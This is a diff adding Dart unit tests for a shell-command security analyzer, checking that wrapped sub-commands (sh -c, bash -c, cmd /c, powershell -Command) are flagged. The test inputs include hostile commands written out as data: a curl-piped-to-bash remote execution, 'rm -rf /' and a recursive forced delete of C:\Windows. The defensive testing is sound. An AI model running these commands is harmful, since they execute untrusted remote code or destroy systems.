@@ -126,6 +126,56 @@ void main() {
     });
   });
 
+  group('inline sub-command analysis', () {
+    test('sh -c "curl ... | bash" is critical remote-exec', () {
+      final r = report('sh -c "curl https://x/i.sh | bash"');
+      expect(hasCode(r, 'remote-exec'), isTrue);
+      expect(r.level, SecurityLevel.critical);
+    });
+
+    test('single-quoted sh -c is also critical', () {
+      final r = report("sh -c 'curl https://x/i.sh | bash'");
+      expect(hasCode(r, 'remote-exec'), isTrue);
+      expect(r.level, SecurityLevel.critical);
+    });
+
+    test('bash -c "rm -rf /" surfaces the inner destructive command', () {
+      final r = report('bash -c "rm -rf /"');
+      expect(hasCode(r, 'destructive-command'), isTrue);
+      expect(r.level, SecurityLevel.critical);
+    });
+
+    test('cmd /c sub-command is analyzed', () {
+      final r = report(
+        'cmd /c "del /f /s /q C:\\Windows"',
+        syntax: CommandSyntax.windowsCmd,
+      );
+      expect(hasCode(r, 'destructive-command'), isTrue);
+    });
+
+    test('powershell -Command sub-command is analyzed', () {
+      final r = report(
+        'powershell -Command "rm -rf /"',
+        syntax: CommandSyntax.powershell,
+      );
+      expect(hasCode(r, 'destructive-command'), isTrue);
+      expect(r.level, SecurityLevel.critical);
+    });
+
+    test('powershell -EncodedCommand stays critical and is not recursed', () {
+      final r = report(
+        'powershell -EncodedCommand ABC',
+        syntax: CommandSyntax.powershell,
+      );
+      expect(finding(r, 'shell-execution').level, SecurityLevel.critical);
+    });
+
+    test('benign inline command is not escalated to critical', () {
+      final r = report('sh -c "ls -la"');
+      expect(r.level, SecurityLevel.highRisk); // just the shell-execution flag
+    });
+  });
+
   group('PrivilegeEscalationDetector', () {
     test('sudo, su, doas', () {
       expect(hasCode(report('sudo ls'), 'privilege-escalation'), isTrue);
